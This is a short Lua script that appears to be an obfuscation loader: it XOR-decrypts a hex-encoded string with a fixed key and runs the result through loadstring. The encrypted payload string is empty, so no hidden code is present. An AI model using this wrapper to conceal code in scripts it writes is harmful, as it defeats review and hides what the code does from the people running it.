local k={201,85,43,251,248,178,50,140,112,49,158,73,67,47,252,89,200,189,137,215,171,112,43,14,252,22,39,4,99,190,183,219}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
